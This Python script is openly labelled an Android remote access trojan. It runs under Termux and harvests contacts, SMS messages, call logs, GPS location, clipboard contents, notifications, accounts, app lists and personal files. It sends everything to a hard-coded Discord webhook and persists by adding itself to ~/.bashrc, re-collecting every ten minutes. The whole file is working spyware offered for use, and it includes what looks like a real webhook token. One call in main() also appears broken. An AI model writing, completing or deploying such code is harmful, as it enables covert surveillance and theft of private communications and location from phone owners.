#!/usr/bin/env python3
"""
Android 16 RAT - Termux:API + Storage Access Framework
Działa na Android 16 bez roota, wysyła na Discord webhook
"""
import os
import sys
import json
import time
import subprocess
import requests
import glob
import sqlite3
import shutil
import tempfile
from datetime import datetime

WEBHOOK = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send(content, file_path=None):
    """Wyślij na webhook – dzieli duże wiadomości"""
    try:
        if file_path and os.path.exists(file_path) and os.path.getsize(file_path) < 8*1024*1024:
            with open(file_path, 'rb') as f:
                requests.post(WEBHOOK, data={"content": content[:500]}, files={"file": (os.path.basename(file_path), f)}, timeout=15)
        else:
            for i in range(0, len(content), 1900):
                requests.post(WEBHOOK, data={"content": content[i:i+1900]}, timeout=15)
    except:
        pass

def cmd(c):
    return subprocess.getoutput(c)

def api(c):
    return subprocess.getoutput(f"timeout 10 {c} 2>/dev/null")

# ============================================================
# 1. DEVICE INFO
# ============================================================
def device_info():
    sdk = cmd("getprop ro.build.version.sdk")
    rel = cmd("getprop ro.build.version.release")
    model = cmd("getprop ro.product.model")
    man = cmd("getprop ro.product.manufacturer")
    id_ = cmd("settings get secure android_id")
    bat = cmd("dumpsys battery | grep level | cut -d: -f2").strip()
    ip = cmd("ip -4 addr show wlan0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")
    oper = cmd("getprop gsm.operator.alpha")
    country = cmd("getprop gsm.operator.iso-country")
    
    msg = f"""**=== DEVICE {id_[:8]} ===**
Model: {model} ({man})
Android: {rel} (SDK {sdk})
Battery: {bat}%
IP: {ip}
Operator: {oper} ({country})
ID: {id_}"""
    send(msg)

# ============================================================
# 2. CONTACTS (Termux:API)
# ============================================================
def contacts():
    data = api("termux-contact-list")
    if not data:
        send("[-] Contacts: no access (grant permission in Settings > Termux)")
        return
    try:
        c = json.loads(data)
        if not c:
            send("[-] Contacts: empty list")
            return
        msg = f"**Contacts ({len(c)}):**\n```\n"
        for x in c[:100]:
            name = x.get('name', '?')
            nums = ', '.join(x.get('numbers', ['?']))
            msg += f"{name}: {nums}\n"
        msg += "```"
        send(msg)
    except:
        send("[-] Contacts: parse error")

# ============================================================
# 3. SMS (content://sms)
# ============================================================
def sms():
    # Inbox
    raw = cmd("content query --uri content://sms/inbox --projection address:body:date_sent:date 2>/dev/null | tail -30")
    if raw and raw.strip():
        send(f"**SMS Inbox:**\n```\n{raw[:1500]}\n```")
    else:
        send("[-] SMS: no access (grant SMS permission)")
    
    # Sent
    raw = cmd("content query --uri content://sms/sent --projection address:body:date_sent 2>/dev/null | tail -20")
    if raw and raw.strip():
        send(f"**SMS Sent:**\n```\n{raw[:1500]}\n```")

# ============================================================
# 4. CALL LOG (content://call_log/calls)
# ============================================================
def calls():
    raw = cmd("content query --uri content://call_log/calls --projection number:date:duration:type 2>/dev/null | tail -30")
    if raw and raw.strip():
        send(f"**Call Log:**\n```\n{raw[:1500]}\n```")
    else:
        send("[-] Call Log: no access")

# ============================================================
# 5. LOCATION (Termux:API)
# ============================================================
def gps():
    data = api("termux-location -p provider 2>/dev/null")
    if not data or data == '{}':
        # Fallback: dumpsys
        raw = cmd("dumpsys location 2>/dev/null | grep -A4 'Last Known' | head -10")
        if raw.strip():
            send(f"**Location (dumpsys):**\n```\n{raw[:500]}\n```")
        else:
            send("[-] Location: no access or GPS off")
        return
    try:
        loc = json.loads(data)
        lat = loc.get('latitude', '?')
        lon = loc.get('longitude', '?')
        acc = loc.get('accuracy', '?')
        prov = loc.get('provider', '?')
        alt = loc.get('altitude', '?')
        msg = f"""**Location:**
Lat: {lat}
Lon: {lon}
Accuracy: {acc}m
Provider: {prov}
Altitude: {alt}m
https://maps.google.com/maps?q={lat},{lon}"""
        send(msg)
    except:
        send("[-] Location: parse error")

# ============================================================
# 6. CLIPBOARD (Termux:API)
# ============================================================
def clipboard():
    data = api("termux-clipboard-get 2>/dev/null")
    if data and len(data) > 3:
        send(f"**Clipboard:**\n```\n{data[:500]}\n```")

# ============================================================
# 7. INSTALLED APPS
# ============================================================
def apps():
    raw = cmd("pm list packages -3 2>/dev/null | cut -d: -f2 | sort")
    if raw.strip():
        send(f"**Third-party apps:**\n```\n{raw[:1500]}\n```")

# ============================================================
# 8. ACCOUNTS (Google etc.)
# ============================================================
def accounts():
    raw = cmd("pm list accounts 2>/dev/null")
    if raw.strip():
        send(f"**Accounts:**\n```\n{raw[:500]}\n```")

# ============================================================
# 9. FILES – internal storage (no root, SAF or glob)
# ============================================================
def files():
    base = "/storage/emulated/0"
    # Tylko foldery dostępne bez root na Android 16
    targets = [
        ("DCIM/Camera", ['.jpg','.png','.mp4']),
        ("Documents", ['.pdf','.docx','.xlsx','.txt','.env','.json']),
        ("Download", ['.apk','.zip','.rar','.pdf']),
        ("Pictures/Screenshots", ['.png','.jpg']),
        ("Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images", ['.jpg','.png']),
    ]
    
    found = []
    for folder, exts in targets:
        path = os.path.join(base, folder)
        if os.path.exists(path):
            for root, dirs, files_ in os.walk(path):
                for f in files_[:5]:
                    if any(f.lower().endswith(e) for e in exts):
                        fp = os.path.join(root, f)
                        if os.path.getsize(fp) < 4*1024*1024:
                            found.append(fp)
    
    if found:
        msg = f"**Files ({len(found)}):**\n```\n"
        for f in found[:25]:
            msg += f"{f} ({os.path.getsize(f)//1024}KB)\n"
        msg += "```"
        send(msg)
        # Wyślij pierwsze 2 jako załączniki
        for f in found[:2]:
            send(f"File: {os.path.basename(f)}", f)
    else:
        send("[-] Files: nothing found or no storage permission")

# ============================================================
# 10. NOTIFICATIONS (Termux:API – działa na Android 16!)
# ============================================================
def notifications():
    data = api("termux-notification-list 2>/dev/null")
    if data and data != '[]':
        try:
            notif = json.loads(data)
            msg = f"**Notifications (last {len(notif)}):**\n```\n"
            for n in notif[:30]:
                pkg = n.get('packageName', '?')
                title = n.get('title', '?')
                text = n.get('text', '?')
                msg += f"[{pkg}] {title}: {text[:80]}\n"
            msg += "```"
            send(msg)
        except:
            send("[-] Notifications: parse error")
    else:
        send("[-] Notifications: no access (grant Notification access in Settings)")

# ============================================================
# 11. MEDIASTORE (Android 16 – via content provider)
# ============================================================
def mediastore():
    """Pobiera zdjęcia przez MediaStore (działa na Android 16)"""
    # To wymaga READ_MEDIA_IMAGES permission
    raw = cmd("content query --uri content://media/external/images/media --projection _display_name:_size:date_added 2>/dev/null | tail -20")
    if raw and raw.strip():
        send(f"**MediaStore Images:**\n```\n{raw[:1500]}\n```")

# ============================================================
# PERSISTENCE (Termux boot)
# ============================================================
def persist():
    script = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    line = f"python3 {script} --daemon &\n"
    try:
        with open(bashrc, 'r') as f:
            if line not in f.read():
                with open(bashrc, 'a') as f:
                    f.write(f"\n# RAT persistence\n{line}")
    except:
        pass

# ============================================================
# MAIN
# ============================================================
def main():
    daemon = '--daemon' in sys.argv
    
    send(device_info.__doc__.replace('\n',' ').strip() if not daemon else "[*] RAT started in daemon mode")
    device_info()
    
    if not daemon:
        send("[*] Collecting data...")
    
    contacts()
    sms()
    calls()
    gps()
    clipboard()
    apps()
    accounts()
    notifications()
    mediastore()
    files()
    
    send("[+] Initial collection complete")
    
    if daemon:
        send("[*] Daemon mode – collecting every 10 minutes")
        while True:
            time.sleep(600)
            sms()
            calls()
            gps()
            clipboard()
            notifications()
            send(f"[*] Heartbeat OK [{datetime.now().strftime('%H:%M')}]")

if __name__ == "__main__":
    main()
